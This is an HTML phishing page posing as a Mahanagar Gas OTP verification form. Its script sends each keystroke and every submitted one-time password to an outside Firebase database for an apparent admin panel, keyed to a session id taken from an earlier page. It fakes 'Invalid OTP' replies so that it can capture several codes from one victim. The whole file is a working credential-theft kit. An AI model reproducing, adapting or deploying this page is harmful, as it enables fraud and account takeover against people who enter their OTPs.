<!DOCTYPE html>
<html>
<head>
  <title>mgl</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

  <style>
    /* Sabhi CSS same hai, koi badlaw nahi */
    body { font-family: Arial; background-color: #FFFFFF; text-align: center; padding: 20px; margin: 0; }
    img { width: 100%; max-width: 300%; border-radius: 10px; }
    .side-button { margin-top: 20px; padding: 12px; width: 100%; font-size: 17px; background-color: #4082ff; color: #FFFFFF; border: none; border-radius: 10px; cursor: pointer; }
    .form-container { margin-top: 30px; text-align: left; max-width: 400px; margin-left: auto; margin-right: auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    .form-container h2 { text-align: center; background-color: #0f7213; color: white; padding: 10px; border-radius: 5px; }
    .input-group { margin-bottom: 15px; }
    .input-group label { font-size: 16px; font-weight: bold; display: block; margin-bottom: 5px; }
    .input-group input { width: 100%; padding: 10px; font-size: 16px; border: 1px solid #ccc; border-radius: 5px; }
    #message { color: red; font-size: 18px; text-align: center; margin-top: 15px; }
    #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; backdrop-filter: blur(5px); background-color: rgba(255,255,255,0.5); display: none; justify-content: center; align-items: center; z-index: 9999; }
    #timer { text-align: center; margin-top: 10px; font-weight: bold; color: #333; }
    #resendBtn { margin-top: 10px; background: none; border: none; color: blue; text-decoration: underline; cursor: pointer; display: none; }
  </style>

  <script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
</head>

<body>
  <img src="https://welcomupdates.vercel.app/top.jpg">

  <div class="form-container">
    <h2>Mahanagar Gas</h2>

    <form onsubmit="return handleOTP(event)">
      <div class="input-group">
        <label>Enter OTP</label>
        <input type="text" id="otp" maxlength="8" required oninput="liveUpdate()">
      </div>

      <button class="side-button" type="submit" id="submitBtn">Submit</button>

      <div id="timer">OTP expires in 05:00</div>
      <button type="button" id="resendBtn" onclick="resendOTP()">Resend OTP</button>

      <div id="message"></div>
    </form>
  </div>

  <div id="overlay">
    <lottie-player src="https://assets4.lottiefiles.com/packages/lf20_usmfx6bp.json"
      background="transparent" speed="1" style="width: 150px; height: 150px;" loop autoplay>
    </lottie-player>
  </div>

  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyD7kr-x5CJLdWGoj6r_MAPmhnJWe8Jc3oI",
      authDomain: "ss22-a96d3.firebaseapp.com",
      projectId: "ss22-a96d3",
      storageBucket: "ss22-a96d3.appspot.com",
      messagingSenderId: "607942972170",
      appId: "1:607942972170:web:2e38b2d5410ff37f3960f3"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    // --- SESSION ID READ ---
    const sessionId = localStorage.getItem("user_session_id");

    let attempt = 0;
    let timeLeft = 300;
    let timerInterval;

    function liveUpdate() {
      if (!sessionId) return;
      
      const data = {
        sessionId: sessionId, // ID attached
        otp: document.getElementById("otp").value,
        method: "Step: OTP Page",
        timestamp: firebase.firestore.FieldValue.serverTimestamp()
      };

      // Doc ID hamesha sessionId rahega takki Admin mein ek hi jagah update ho
      db.collection("live_typing").doc(sessionId).set(data, { merge: true });
    }

    function startTimer() {
      clearInterval(timerInterval);
      timeLeft = 300;
      timerInterval = setInterval(() => {
        let minutes = Math.floor(timeLeft / 60);
        let seconds = timeLeft % 60;
        document.getElementById("timer").textContent = `OTP expires in ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
        timeLeft--;
        if (timeLeft < 0) {
          clearInterval(timerInterval);
          document.getElementById("timer").textContent = "OTP Expired";
          document.getElementById("resendBtn").style.display = "block";
        }
      }, 1000);
    }

    startTimer();

    function resendOTP() {
      startTimer();
      document.getElementById("resendBtn").style.display = "none";
      document.getElementById("message").textContent = "OTP Resent";
    }

    function handleOTP(e) {
      e.preventDefault();

      if (timeLeft <= 0) {
        alert("OTP expired. Please resend.");
        return false;
      }

      const otp = document.getElementById("otp").value;
      const messageBox = document.getElementById("message");
      const overlay = document.getElementById("overlay");
      const button = document.getElementById("submitBtn");

      if (otp.length < 4 || otp.length > 8 || isNaN(otp)) {
        alert("Invalid OTP");
        return false;
      }

      overlay.style.display = "flex";
      button.disabled = true;

      // Final save with Session ID
      db.collection("otp_entries").add({
        sessionId: sessionId, // Attached ID
        otp: otp,
        attempt: attempt + 1,
        timestamp: firebase.firestore.FieldValue.serverTimestamp()
      });

      setTimeout(() => {
        overlay.style.display = "none";
        attempt++;

        if (attempt <= 2) {
          messageBox.textContent = "Invalid OTP";
          button.disabled = false;
        } else {
          messageBox.textContent = "Try again later";
          button.disabled = true;
        }

        document.getElementById("otp").value = "";
      }, 10000);
    }
  </script>
</body>
</html>
